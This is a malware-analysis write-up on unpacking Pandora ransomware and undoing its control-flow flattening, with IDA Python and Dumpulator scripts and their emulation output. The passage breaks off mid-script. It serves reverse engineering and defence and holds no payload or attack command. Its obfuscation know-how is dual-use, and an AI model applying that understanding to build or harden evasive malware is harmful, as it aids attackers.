            "content": "There was a &#39;Not Found&#39; error fetching URL: &#39;https://twitter.com/kienbigmummy/status/1504750051956240384/photo/1&#39; . . Overview . Sample: 5b56c5d86347e164c6e571c86dbf5b1535eae6b979fede6ed66b01e79ea33b7b . Sample is x64 and is on malshare. . Unpacked sample 2619862c382d3e375f13f3859c6ab44db1a4bce905b4a617df2390fbf36902e7 . References . f0wl blog Pandora Ransomware | Control Flow Flattening | Deobfuscation - Recovering an ollvm | stadeo deobfuscation tool | Control Flow Unflattening | . Stage 1 Unpacking . Stage1 is just a modified UPX. We can unpack it with the following steps. . removed X permissions from the first PE section memory | run till exception | excpetion EIP is OEP for PE | dump and reconstruct imports with Scylla | . Payload Obfuscation . The ransomware has both obfuscated strings and control flow obfuscation. The obfuscated strings can be deobfuscated directly with an emulator call to the deobfuscation function. The cf obfuscation requires special attention. . Control Flow Obfuscation . Many function in the binary have been obfuscated using two layers of obfuscation. First control flow flattening (CFF) has been applied to convert the original code basic blocks into a state machine and force all flow through a dispatcher. For each state the dispatcher determines the control flow. Then a second layer of obfuscation has been applied to the basic blocks that make up the dispatcher. The dispatcher bbs are seperated with conditional jmp statements that require a lookup in a hard coded jmp table. This hard coded jmp table may be an attempt to frustrate symbolic execution (a traditional tool for CFF deobfuscation.) The flow is discribed below. . basic blocks (bb) that contain the actual payload code are accessed via a state machine - each bb has a state | the dispatcher for the state machine uses the bb state as a key which is used to calculate jumps between it&#39;s own (dispatcher) basic blocks | the (dispatcher) bb uses a compare with the key/state to generate a conditional lookup in a hard coded jump table | the jump table contains an obfuscated address of the next bb, either another dispatcher bb or the original code bb | . Deobfuscation Steps . Our approach is to seperate the dispatcher bb from the payload bb. For each dispatcher bb the code is emulated with all conditions to generate the conditional jump addresses. The bb is then replaced with a simple compare and conditional jmp. Emulation is done with Dumpulator. . Once the dispatcher has been deobfuscated we should be able to see the control flow for the payload bb and futher simplify the dispatcher using more traditional tools, possibly removing it completely. . r14 = FFFFFFFFAE6529F8 00007FF6C4B068E3 | 3D E1A53B17 | cmp eax,173BA5E1 | not part of cf 00007FF6C4B068E8 | BA D8000000 | mov edx,D8 | rdx = 0xd8 00007FF6C4B068ED | BD 20010000 | mov ebp,120 | rbp = 0x120 00007FF6C4B068F2 | 48:0F4CD5 | cmovl rdx,rbp | 00007FF6C4B068F6 | 48:8B1411 | mov rdx,qword ptr ds:[rcx+rdx] | table:00007FF6C4B69640 + rdx = rdx=00007FF7164B42E9 00007FF6C4B068FA | 4C:01F2 | add rdx,r14 |rdx=00007FF7164B42E9 + r14 00007FF6C4B068FD | FFE2 | jmp rdx | rdx = 00007FF6C4B06CE1 . if the jump is relative it&#39;s for a code bb . if the jump is reg then it&#39;s a cf bb . if there is a ret this is the end . start = 0x00007FF6C4B067F0 last_jmp = 0x00007FF6C4B0706C end = 0x00007FF6C4B070D0 . build a table of bb the start is next head after jmp, end is jmp emulate patch the jmp for each table entry . IDA Produce Basic Block Table . There are two dispatcher bb formats, one that uses cmovl, cmovz, and one that uses setl and setz. We need to match both patterns and determine the type of condition for our jmp statement, and the eax cmp value. For each bb record the following information so it can be used in our emulator. . bb start | bb end | add cmov instruction | type of cmov instruction (l,z) | eax cmp value | jmp register | . Results: (bb_start, bb_end, eax_value, jmp_condition,jmp_condition_address, jmp_register) . # Basic blocks for dispatcher bb_table = [] # List of addresses of original code basic blocks bb_orig_table = [] ptr = 0x00007FF6C4B067C8 end = 0x00007FF6C4B070D0 bb_start = ptr while ptr &lt;= end: if print_insn_mnem(ptr) == &#39;jmp&#39;: op_type = idc.get_operand_type(ptr, 0) if op_type == o_reg: # This is a cf bb save it reg_name = print_operand(ptr, 0) # Get eax value first_instruction = print_insn_mnem(bb_start) if first_instruction == &#39;cmp&#39;: eax_cmp_value = get_operand_value(bb_start,1) # Find cmov instruction bb_ptr = bb_start jmp_condition = None jmp_condition_address = None while bb_ptr &lt; ptr: if &#39;cmovl&#39; == print_insn_mnem(bb_ptr): jmp_condition = &#39;cmovl&#39; break elif &#39;cmovz&#39; == print_insn_mnem(bb_ptr): jmp_condition = &#39;cmovz&#39; break bb_ptr = next_head(bb_ptr) jmp_condition_address = bb_ptr # Check results of cmov find if jmp_condition is None: # This bb doesn&#39;t match our pattern skip it print(f&quot;BB at {hex(bb_start)} doesn&#39;t contain cmovl or cmovz, skip it&quot;) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr continue elif first_instruction == &#39;xor&#39;: # assume next instruction is the cmp, we should check ptr_cmp = next_head(bb_start) if &quot;cmp&quot; != print_insn_mnem(ptr_cmp): # This bb doesn&#39;t match our pattern skip it print(f&quot;BB at {hex(bb_start)} doesn&#39;t contain have cmp after xor, skip it&quot;) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr continue eax_cmp_value = get_operand_value(ptr_cmp,1) # Find cmov instruction bb_ptr = bb_start jmp_condition = None jmp_condition_address = None while bb_ptr &lt; ptr: if &#39;setl&#39; == print_insn_mnem(bb_ptr): jmp_condition = &#39;setl&#39; break elif &#39;setz&#39; == print_insn_mnem(bb_ptr): jmp_condition = &#39;setz&#39; break elif &#39;setnz&#39; == print_insn_mnem(bb_ptr): jmp_condition = &#39;setnz&#39; break bb_ptr = next_head(bb_ptr) jmp_condition_address = bb_ptr # Check results of cmov find if jmp_condition is None: # This bb doesn&#39;t match our pattern skip it print(f&quot;BB at {hex(bb_start)} doesn&#39;t contain setl or setz, skip it&quot;) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr continue else: # This bb doesn&#39;t match our pattern skip it print(f&quot;BB at {hex(bb_start)} doesn&#39;t match pattern, skip it&quot;) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr continue print(f&quot;Dispatcher bb {hex(bb_start)}&quot;) bb_table.append((bb_start,ptr,eax_cmp_value,jmp_condition,jmp_condition_address,reg_name)) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr else: # This is code bb don&#39;t save it print(f&quot;Original code bb {hex(bb_start)}&quot;) bb_orig_table.append(bb_start) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr else: ptr = next_head(ptr) . Emulate Basic Blocks . For each dispatcher bb emulate the block both satisfying the condition and not satisfying it to produce both the jmp address for the conditional jmp and the jmp address for the unconditional jmp. . DUMP_FILE = &#39;/tmp/pandora.dmp&#39; from dumpulator import Dumpulator dp = Dumpulator(DUMP_FILE, quiet=True) # temp_addr = dp.allocate(256) # dp.call(0x140001000, [temp_addr, 0x140017000]) # decrypted = dp.read_str(temp_addr) # print(f&quot;decrypted: &#39;{decrypted}&#39;&quot;) # # Obfuscation key for table values # dp.regs.r14 = 0xFFFFFFFFAE6529F8 # # Pointer to the jmp table # dp.regs.rcx = 0x00007FF6C4B69640 # dp.start(0x00007FF6C4B068E8,end=0x00007FF6C4B068FD) dp = Dumpulator(DUMP_FILE, quiet=True) #(bb_start, bb_end, eax_value, jmp_condition,jmp_condition_address, jmp_register) #bb_table = [(0x7ff6c4b067f0, 0x7ff6c4b06817, 0x10bc6c78, &#39;cmovl&#39;, 0x7ff6c4b067fa, &#39;rdx&#39;), (0x7ff6c4b06819, 0x7ff6c4b0682e, 0xffffffffc30bae2e, &#39;cmovl&#39;, 0x7ff6c4b06823, &#39;rdx&#39;), (0x7ff6c4b06830, 0x7ff6c4b06845, 0xffffffffa2992627, &#39;cmovl&#39;, 0x7ff6c4b0683a, &#39;rdx&#39;), (0x7ff6c4b06847, 0x7ff6c4b06861, 0xffffffffa22a16af, &#39;cmovl&#39;, 0x7ff6c4b06856, &#39;rdx&#39;), (0x7ff6c4b06863, 0x7ff6c4b0687d, 0xffffffff8cbc0434, &#39;cmovz&#39;, 0x7ff6c4b06872, &#39;rcx&#39;), (0x7ff6c4b068b0, 0x7ff6c4b068c5, 0x6c249751, &#39;cmovl&#39;, 0x7ff6c4b068ba, &#39;rdx&#39;), (0x7ff6c4b068c7, 0x7ff6c4b068e1, 0x3b2b8a1e, &#39;cmovl&#39;, 0x7ff6c4b068d6, &#39;rdx&#39;), (0x7ff6c4b068e3, 0x7ff6c4b068fd, 0x173ba5e1, &#39;cmovl&#39;, 0x7ff6c4b068f2, &#39;rdx&#39;), (0x7ff6c4b068ff, 0x7ff6c4b06918, 0x10bc6c78, &#39;setz&#39;, 0x7ff6c4b06906, &#39;rcx&#39;), (0x7ff6c4b069b0, 0x7ff6c4b069ca, 0xffffffffd43fb344, &#39;cmovl&#39;, 0x7ff6c4b069bf, &#39;rdx&#39;), (0x7ff6c4b069cc, 0x7ff6c4b069e6, 0xffffffffcef7092e, &#39;cmovl&#39;, 0x7ff6c4b069db, &#39;rdx&#39;), (0x7ff6c4b069e8, 0x7ff6c4b06a02, 0xffffffffc30bae2e, &#39;cmovz&#39;, 0x7ff6c4b069f7, &#39;rcx&#39;), (0x7ff6c4b06a30, 0x7ff6c4b06a4a, 0x7d71a1e3, &#39;cmovl&#39;, 0x7ff6c4b06a3f, &#39;rdx&#39;), (0x7ff6c4b06a4c, 0x7ff6c4b06a66, 0x7a980236, &#39;cmovl&#39;, 0x7ff6c4b06a5b, &#39;rdx&#39;), (0x7ff6c4b06a68, 0x7ff6c4b06a82, 0x6c249751, &#39;cmovz&#39;, 0x7ff6c4b06a77, &#39;rcx&#39;), (0x7ff6c4b06a99, 0x7ff6c4b06ab3, 0xffffffffc094d6c9, &#39;cmovl&#39;, 0x7ff6c4b06aa8, &#39;rdx&#39;), (0x7ff6c4b06ab5, 0x7ff6c4b06acf, 0xffffffffa2992627, &#39;cmovz&#39;, 0x7ff6c4b06ac4, &#39;rcx&#39;), (0x7ff6c4b06b09, 0x7ff6c4b06b1e, 0x3cd69d30, &#39;setl&#39;, 0x7ff6c4b06b10, &#39;rdx&#39;), (0x7ff6c4b06b20, 0x7ff6c4b06b39, 0x3b2b8a1e, &#39;setnz&#39;, 0x7ff6c4b06b27, &#39;rcx&#39;), (0x7ff6c4b06b63, 0x7ff6c4b06b7d, 0xffffffffecce8ff1, &#39;cmovl&#39;, 0x7ff6c4b06b72, &#39;rdx&#39;), (0x7ff6c4b06b7f, 0x7ff6c4b06b99, 0xffffffffd43fb344, &#39;cmovz&#39;, 0x7ff6c4b06b8e, &#39;rcx&#39;), (0x7ff6c4b06bbb, 0x7ff6c4b06bd5, 0x7d9d86f3, &#39;cmovl&#39;, 0x7ff6c4b06bca, &#39;rdx&#39;), (0x7ff6c4b06bd7, 0x7ff6c4b06bf1, 0x7d71a1e3, &#39;cmovz&#39;, 0x7ff6c4b06be6, &#39;rcx&#39;), (0x7ff6c4b06c45, 0x7ff6c4b06c5f, 0xffffffffa22a16af, &#39;cmovz&#39;, 0x7ff6c4b06c54, &#39;rcx&#39;), (0x7ff6c4b06ce1, 0x7ff6c4b06cfb, 0x173ba5e1, &#39;cmovz&#39;, 0x7ff6c4b06cf0, &#39;rcx&#39;), (0x7ff6c4b06e83, 0x7ff6c4b06e9d, 0xffffffffcef7092e, &#39;cmovz&#39;, 0x7ff6c4b06e92, &#39;rcx&#39;), (0x7ff6c4b06edc, 0x7ff6c4b06ef6, 0x7a980236, &#39;cmovz&#39;, 0x7ff6c4b06eeb, &#39;rcx&#39;), (0x7ff6c4b06f3d, 0x7ff6c4b06f56, 0xffffffffc094d6c9, &#39;setz&#39;, 0x7ff6c4b06f44, &#39;rcx&#39;), (0x7ff6c4b07008, 0x7ff6c4b07022, 0x3cd69d30, &#39;cmovz&#39;, 0x7ff6c4b07017, &#39;rcx&#39;), (0x7ff6c4b07052, 0x7ff6c4b0706c, 0xffffffffecce8ff1, &#39;cmovz&#39;, 0x7ff6c4b07061, &#39;rcx&#39;)] # Above is the old table that was missing one bb because we started our search too late bb_table = [(0x7ff6c4b067c8, 0x7ff6c4b067e2, 0x7d9d86f3, &#39;cmovz&#39;, 0x7ff6c4b067d7, &#39;rcx&#39;), (0x7ff6c4b067f0, 0x7ff6c4b06817, 0x10bc6c78, &#39;cmovl&#39;, 0x7ff6c4b067fa, &#39;rdx&#39;), (0x7ff6c4b06819, 0x7ff6c4b0682e, 0xffffffffc30bae2e, &#39;cmovl&#39;, 0x7ff6c4b06823, &#39;rdx&#39;), (0x7ff6c4b06830, 0x7ff6c4b06845, 0xffffffffa2992627, &#39;cmovl&#39;, 0x7ff6c4b0683a, &#39;rdx&#39;), (0x7ff6c4b06847, 0x7ff6c4b06861, 0xffffffffa22a16af, &#39;cmovl&#39;, 0x7ff6c4b06856, &#39;rdx&#39;), (0x7ff6c4b06863, 0x7ff6c4b0687d, 0xffffffff8cbc0434, &#39;cmovz&#39;, 0x7ff6c4b06872, &#39;rcx&#39;), (0x7ff6c4b068b0, 0x7ff6c4b068c5, 0x6c249751, &#39;cmovl&#39;, 0x7ff6c4b068ba, &#39;rdx&#39;), (0x7ff6c4b068c7, 0x7ff6c4b068e1, 0x3b2b8a1e, &#39;cmovl&#39;, 0x7ff6c4b068d6, &#39;rdx&#39;), (0x7ff6c4b068e3, 0x7ff6c4b068fd, 0x173ba5e1, &#39;cmovl&#39;, 0x7ff6c4b068f2, &#39;rdx&#39;), (0x7ff6c4b068ff, 0x7ff6c4b06918, 0x10bc6c78, &#39;setz&#39;, 0x7ff6c4b06906, &#39;rcx&#39;), (0x7ff6c4b069b0, 0x7ff6c4b069ca, 0xffffffffd43fb344, &#39;cmovl&#39;, 0x7ff6c4b069bf, &#39;rdx&#39;), (0x7ff6c4b069cc, 0x7ff6c4b069e6, 0xffffffffcef7092e, &#39;cmovl&#39;, 0x7ff6c4b069db, &#39;rdx&#39;), (0x7ff6c4b069e8, 0x7ff6c4b06a02, 0xffffffffc30bae2e, &#39;cmovz&#39;, 0x7ff6c4b069f7, &#39;rcx&#39;), (0x7ff6c4b06a30, 0x7ff6c4b06a4a, 0x7d71a1e3, &#39;cmovl&#39;, 0x7ff6c4b06a3f, &#39;rdx&#39;), (0x7ff6c4b06a4c, 0x7ff6c4b06a66, 0x7a980236, &#39;cmovl&#39;, 0x7ff6c4b06a5b, &#39;rdx&#39;), (0x7ff6c4b06a68, 0x7ff6c4b06a82, 0x6c249751, &#39;cmovz&#39;, 0x7ff6c4b06a77, &#39;rcx&#39;), (0x7ff6c4b06a99, 0x7ff6c4b06ab3, 0xffffffffc094d6c9, &#39;cmovl&#39;, 0x7ff6c4b06aa8, &#39;rdx&#39;), (0x7ff6c4b06ab5, 0x7ff6c4b06acf, 0xffffffffa2992627, &#39;cmovz&#39;, 0x7ff6c4b06ac4, &#39;rcx&#39;), (0x7ff6c4b06b09, 0x7ff6c4b06b1e, 0x3cd69d30, &#39;setl&#39;, 0x7ff6c4b06b10, &#39;rdx&#39;), (0x7ff6c4b06b20, 0x7ff6c4b06b39, 0x3b2b8a1e, &#39;setnz&#39;, 0x7ff6c4b06b27, &#39;rcx&#39;), (0x7ff6c4b06b63, 0x7ff6c4b06b7d, 0xffffffffecce8ff1, &#39;cmovl&#39;, 0x7ff6c4b06b72, &#39;rdx&#39;), (0x7ff6c4b06b7f, 0x7ff6c4b06b99, 0xffffffffd43fb344, &#39;cmovz&#39;, 0x7ff6c4b06b8e, &#39;rcx&#39;), (0x7ff6c4b06bbb, 0x7ff6c4b06bd5, 0x7d9d86f3, &#39;cmovl&#39;, 0x7ff6c4b06bca, &#39;rdx&#39;), (0x7ff6c4b06bd7, 0x7ff6c4b06bf1, 0x7d71a1e3, &#39;cmovz&#39;, 0x7ff6c4b06be6, &#39;rcx&#39;), (0x7ff6c4b06c45, 0x7ff6c4b06c5f, 0xffffffffa22a16af, &#39;cmovz&#39;, 0x7ff6c4b06c54, &#39;rcx&#39;), (0x7ff6c4b06ce1, 0x7ff6c4b06cfb, 0x173ba5e1, &#39;cmovz&#39;, 0x7ff6c4b06cf0, &#39;rcx&#39;), (0x7ff6c4b06e83, 0x7ff6c4b06e9d, 0xffffffffcef7092e, &#39;cmovz&#39;, 0x7ff6c4b06e92, &#39;rcx&#39;), (0x7ff6c4b06edc, 0x7ff6c4b06ef6, 0x7a980236, &#39;cmovz&#39;, 0x7ff6c4b06eeb, &#39;rcx&#39;), (0x7ff6c4b06f3d, 0x7ff6c4b06f56, 0xffffffffc094d6c9, &#39;setz&#39;, 0x7ff6c4b06f44, &#39;rcx&#39;), (0x7ff6c4b07008, 0x7ff6c4b07022, 0x3cd69d30, &#39;cmovz&#39;, 0x7ff6c4b07017, &#39;rcx&#39;), (0x7ff6c4b07052, 0x7ff6c4b0706c, 0xffffffffecce8ff1, &#39;cmovz&#39;, 0x7ff6c4b07061, &#39;rcx&#39;)] bb_jmp_table = [] def emulate_bb(bb_start, bb_end, eax_value, jmp_reg): dp.regs.eflags = 0 dp.regs.r15 = 0x190 dp.regs.r14 = 0x0FFFFFFFFAE6529F8 dp.regs.r13 = 0x10 dp.regs.r12 = 0x1B0 dp.regs.rcx = 0x00007FF6C4B69640 dp.regs.rax = eax_value dp.start(bb_start,end=bb_end) jmp_reg_value = dp.regs.__getattr__(jmp_reg) return jmp_reg_value ## We need to calculate two jmp addresses conditional on the eax compare ## based on these we can replace the control bb with conditional jmps based on the compare # def get_jmp(start_ea, end_ea, reg_name, jmp_cond): # dp.regs.r15 = 0x190 # dp.regs.r14 = 0x0FFFFFFFFAE6529F8 # dp.regs.r13 = 0x10 # dp.regs.r12 = 0x1B0 # dp.regs.rcx = 0x00007FF6C4B69640 # if jmp_cond: # else: # dp.start(start_ea,end=end_ea) # print(hex(dp.regs.__getattr__(reg_name))) for bb in bb_table: bb_start = bb[0] bb_end = bb[1] eax_value = bb[2] jmp_condition = bb[3] jmp_condition_address = bb[4] jmp_register = bb[5] # One emulation to satisfy conditon and one without if jmp_condition == &#39;cmovl&#39; or jmp_condition == &#39;setl&#39;: jmp_addr_satisfied = emulate_bb(bb_start, bb_end, eax_value - 1, jmp_register) jmp_addr_unsatisfied = emulate_bb(bb_start, bb_end, eax_value + 1, jmp_register) elif jmp_condition == &#39;cmovz&#39; or jmp_condition == &#39;setz&#39;: jmp_addr_satisfied = emulate_bb(bb_start, bb_end, eax_value, jmp_register) jmp_addr_unsatisfied = emulate_bb(bb_start, bb_end, eax_value + 1, jmp_register) elif jmp_condition == &#39;setnz&#39;: jmp_addr_satisfied = emulate_bb(bb_start, bb_end, eax_value + 1, jmp_register) jmp_addr_unsatisfied = emulate_bb(bb_start, bb_end, eax_value, jmp_register) print(f&quot;BB {hex(bb_start)}:{hex(bb_end)} - jmp_addr_satisfied: {hex(jmp_addr_satisfied)} - jmp_addr_unsatisfied: {hex(jmp_addr_unsatisfied)}&quot;) bb_jmp_table.append((bb_start,bb_end,eax_value,jmp_condition,jmp_condition_address,jmp_register,jmp_addr_satisfied,jmp_addr_unsatisfied)) for bb in bb_jmp_table: print(bb) . BB 0x7ff6c4b067c8:0x7ff6c4b067e2 - jmp_addr_satisfied: 0x7ff6c4b070d1 - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b067f0:0x7ff6c4b06817 - jmp_addr_satisfied: 0x7ff6c4b06819 - jmp_addr_unsatisfied: 0x7ff6c4b068b0 BB 0x7ff6c4b06819:0x7ff6c4b0682e - jmp_addr_satisfied: 0x7ff6c4b06830 - jmp_addr_unsatisfied: 0x7ff6c4b069b0 BB 0x7ff6c4b06830:0x7ff6c4b06845 - jmp_addr_satisfied: 0x7ff6c4b06847 - jmp_addr_unsatisfied: 0x7ff6c4b06a99 BB 0x7ff6c4b06847:0x7ff6c4b06861 - jmp_addr_satisfied: 0x7ff6c4b06863 - jmp_addr_unsatisfied: 0x7ff6c4b06c45 BB 0x7ff6c4b06863:0x7ff6c4b0687d - jmp_addr_satisfied: 0x7ff6c4b0687f - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b068b0:0x7ff6c4b068c5 - jmp_addr_satisfied: 0x7ff6c4b068c7 - jmp_addr_unsatisfied: 0x7ff6c4b06a30 BB 0x7ff6c4b068c7:0x7ff6c4b068e1 - jmp_addr_satisfied: 0x7ff6c4b068e3 - jmp_addr_unsatisfied: 0x7ff6c4b06b09 BB 0x7ff6c4b068e3:0x7ff6c4b068fd - jmp_addr_satisfied: 0x7ff6c4b068ff - jmp_addr_unsatisfied: 0x7ff6c4b06ce1 BB 0x7ff6c4b068ff:0x7ff6c4b06918 - jmp_addr_satisfied: 0x7ff6c4b0691a - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b069b0:0x7ff6c4b069ca - jmp_addr_satisfied: 0x7ff6c4b069cc - jmp_addr_unsatisfied: 0x7ff6c4b06b63 BB 0x7ff6c4b069cc:0x7ff6c4b069e6 - jmp_addr_satisfied: 0x7ff6c4b069e8 - jmp_addr_unsatisfied: 0x7ff6c4b06e83 BB 0x7ff6c4b069e8:0x7ff6c4b06a02 - jmp_addr_satisfied: 0x7ff6c4b06a04 - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b06a30:0x7ff6c4b06a4a - jmp_addr_satisfied: 0x7ff6c4b06a4c - jmp_addr_unsatisfied: 0x7ff6c4b06bbb BB 0x7ff6c4b06a4c:0x7ff6c4b06a66 - jmp_addr_satisfied: 0x7ff6c4b06a68 - jmp_addr_unsatisfied: 0x7ff6c4b06edc BB 0x7ff6c4b06a68:0x7ff6c4b06a82 - jmp_addr_satisfied: 0x7ff6c4b06a84 - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b06a99:0x7ff6c4b06ab3 - jmp_addr_satisfied: 0x7ff6c4b06ab5 - jmp_addr_unsatisfied: 0x7ff6c4b06f3d BB 0x7ff6c4b06ab5:0x7ff6c4b06acf - jmp_addr_satisfied: 0x7ff6c4b06ad1 - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b06b09:0x7ff6c4b06b1e - jmp_addr_satisfied: 0x7ff6c4b06b20 - jmp_addr_unsatisfied: 0x7ff6c4b07008 BB 0x7ff6c4b06b20:0x7ff6c4b06b39 - jmp_addr_satisfied: 0x7ff6c4b067f0 - jmp_addr_unsatisfied: 0x7ff6c4b06b3b BB 0x7ff6c4b06b63:0x7ff6c4b06b7d - jmp_addr_satisfied: 0x7ff6c4b06b7f - jmp_addr_unsatisfied: 0x7ff6c4b07052 BB 0x7ff6c4b06b7f:0x7ff6c4b06b99 - jmp_addr_satisfied: 0x7ff6c4b06b9b - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b06bbb:0x7ff6c4b06bd5 - jmp_addr_satisfied: 0x7ff6c4b06bd7 - jmp_addr_unsatisfied: 0x7ff6c4b067c8 BB 0x7ff6c4b06bd7:0x7ff6c4b06bf1 - jmp_addr_satisfied: 0x7ff6c4b06bf3 - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b06c45:0x7ff6c4b06c5f - jmp_addr_satisfied: 0x7ff6c4b06c61 - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b06ce1:0x7ff6c4b06cfb - jmp_addr_satisfied: 0x7ff6c4b06cfd - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b06e83:0x7ff6c4b06e9d - jmp_addr_satisfied: 0x7ff6c4b06e9f - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b06edc:0x7ff6c4b06ef6 - jmp_addr_satisfied: 0x7ff6c4b06ef8 - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b06f3d:0x7ff6c4b06f56 - jmp_addr_satisfied: 0x7ff6c4b06f58 - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b07008:0x7ff6c4b07022 - jmp_addr_satisfied: 0x7ff6c4b07024 - jmp_addr_unsatisfied: 0x7ff6c4b067f0 BB 0x7ff6c4b07052:0x7ff6c4b0706c - jmp_addr_satisfied: 0x7ff6c4b0706e - jmp_addr_unsatisfied: 0x7ff6c4b067f0 (140697838577608, 140697838577634, 2107475699, &#39;cmovz&#39;, 140697838577623, &#39;rcx&#39;, 140697838579921, 140697838577648) (140697838577648, 140697838577687, 280783992, &#39;cmovl&#39;, 140697838577658, &#39;rdx&#39;, 140697838577689, 140697838577840) (140697838577689, 140697838577710, 18446744072686906926, &#39;cmovl&#39;, 140697838577699, &#39;rdx&#39;, 140697838577712, 140697838578096) (140697838577712, 140697838577733, 18446744072142530087, &#39;cmovl&#39;, 140697838577722, &#39;rdx&#39;, 140697838577735, 140697838578329) (140697838577735, 140697838577761, 18446744072135251631, &#39;cmovl&#39;, 140697838577750, &#39;rdx&#39;, 140697838577763, 140697838578757) (140697838577763, 140697838577789, 18446744071775716404, &#39;cmovz&#39;, 140697838577778, &#39;rcx&#39;, 140697838577791, 140697838577648) (140697838577840, 140697838577861, 1814337361, &#39;cmovl&#39;, 140697838577850, &#39;rdx&#39;, 140697838577863, 140697838578224) (140697838577863, 140697838577889, 992709150, &#39;cmovl&#39;, 140697838577878, &#39;rdx&#39;, 140697838577891, 140697838578441) (140697838577891, 140697838577917, 389785057, &#39;cmovl&#39;, 140697838577906, &#39;rdx&#39;, 140697838577919, 140697838578913) (140697838577919, 140697838577944, 280783992, &#39;setz&#39;, 140697838577926, &#39;rcx&#39;, 140697838577946, 140697838577648) (140697838578096, 140697838578122, 18446744072975528772, &#39;cmovl&#39;, 140697838578111, &#39;rdx&#39;, 140697838578124, 140697838578531) (140697838578124, 140697838578150, 18446744072886880558, &#39;cmovl&#39;, 140697838578139, &#39;rdx&#39;, 140697838578152, 140697838579331) (140697838578152, 140697838578178, 18446744072686906926, &#39;cmovz&#39;, 140697838578167, &#39;rcx&#39;, 140697838578180, 140697838577648) (140697838578224, 140697838578250, 2104599011, &#39;cmovl&#39;, 140697838578239, &#39;rdx&#39;, 140697838578252, 140697838578619) (140697838578252, 140697838578278, 2056782390, &#39;cmovl&#39;, 140697838578267, &#39;rdx&#39;, 140697838578280, 140697838579420) (140697838578280, 140697838578306, 1814337361, &#39;cmovz&#39;, 140697838578295, &#39;rcx&#39;, 140697838578308, 140697838577648) (140697838578329, 140697838578355, 18446744072645564105, &#39;cmovl&#39;, 140697838578344, &#39;rdx&#39;, 140697838578357, 140697838579517) (140697838578357, 140697838578383, 18446744072142530087, &#39;cmovz&#39;, 140697838578372, &#39;rcx&#39;, 140697838578385, 140697838577648) (140697838578441, 140697838578462, 1020697904, &#39;setl&#39;, 140697838578448, &#39;rdx&#39;, 140697838578464, 140697838579720) (140697838578464, 140697838578489, 992709150, &#39;setnz&#39;, 140697838578471, &#39;rcx&#39;, 140697838577648, 140697838578491) (140697838578531, 140697838578557, 18446744073387544561, &#39;cmovl&#39;, 140697838578546, &#39;rdx&#39;, 140697838578559, 140697838579794) (140697838578559, 140697838578585, 18446744072975528772, &#39;cmovz&#39;, 140697838578574, &#39;rcx&#39;, 140697838578587, 140697838577648) (140697838578619, 140697838578645, 2107475699, &#39;cmovl&#39;, 140697838578634, &#39;rdx&#39;, 140697838578647, 140697838577608) (140697838578647, 140697838578673, 2104599011, &#39;cmovz&#39;, 140697838578662, &#39;rcx&#39;, 140697838578675, 140697838577648) (140697838578757, 140697838578783, 18446744072135251631, &#39;cmovz&#39;, 140697838578772, &#39;rcx&#39;, 140697838578785, 140697838577648) (140697838578913, 140697838578939, 389785057, &#39;cmovz&#39;, 140697838578928, &#39;rcx&#39;, 140697838578941, 140697838577648) (140697838579331, 140697838579357, 18446744072886880558, &#39;cmovz&#39;, 140697838579346, &#39;rcx&#39;, 140697838579359, 140697838577648) (140697838579420, 140697838579446, 2056782390, &#39;cmovz&#39;, 140697838579435, &#39;rcx&#39;, 140697838579448, 140697838577648) (140697838579517, 140697838579542, 18446744072645564105, &#39;setz&#39;, 140697838579524, &#39;rcx&#39;, 140697838579544, 140697838577648) (140697838579720, 140697838579746, 1020697904, &#39;cmovz&#39;, 140697838579735, &#39;rcx&#39;, 140697838579748, 140697838577648) (140697838579794, 140697838579820, 18446744073387544561, &#39;cmovz&#39;, 140697838579809, &#39;rcx&#39;, 140697838579822, 140697838577648) . IDA Patch Basic Blocks . Copy the output table from our emulator and use it to patch out each bb with a conditional jmp and an unconditional jmp based on the emulation results. . import struct bb_jmp_table = [(140697838577608, 140697838577634, 2107475699, &#39;cmovz&#39;, 140697838577623, &#39;rcx&#39;, 140697838579921, 140697838577648), (140697838577648, 140697838577687, 280783992, &#39;cmovl&#39;, 140697838577658, &#39;rdx&#39;, 140697838577689, 140697838577840), (140697838577689, 140697838577710, 18446744072686906926, &#39;cmovl&#39;, 140697838577699, &#39;rdx&#39;, 140697838577712, 140697838578096), (140697838577712, 140697838577733, 18446744072142530087, &#39;cmovl&#39;, 140697838577722, &#39;rdx&#39;, 140697838577735, 140697838578329), (140697838577735, 140697838577761, 18446744072135251631, &#39;cmovl&#39;, 140697838577750, &#39;rdx&#39;, 140697838577763, 140697838578757), (140697838577763, 140697838577789, 18446744071775716404, &#39;cmovz&#39;, 140697838577778, &#39;rcx&#39;, 140697838577791, 140697838577648), (140697838577840, 140697838577861, 1814337361, &#39;cmovl&#39;, 140697838577850, &#39;rdx&#39;, 140697838577863, 140697838578224), (140697838577863, 140697838577889, 992709150, &#39;cmovl&#39;, 140697838577878, &#39;rdx&#39;, 140697838577891, 140697838578441), (140697838577891, 140697838577917, 389785057, &#39;cmovl&#39;, 140697838577906, &#39;rdx&#39;, 140697838577919, 140697838578913), (140697838577919, 140697838577944, 280783992, &#39;setz&#39;, 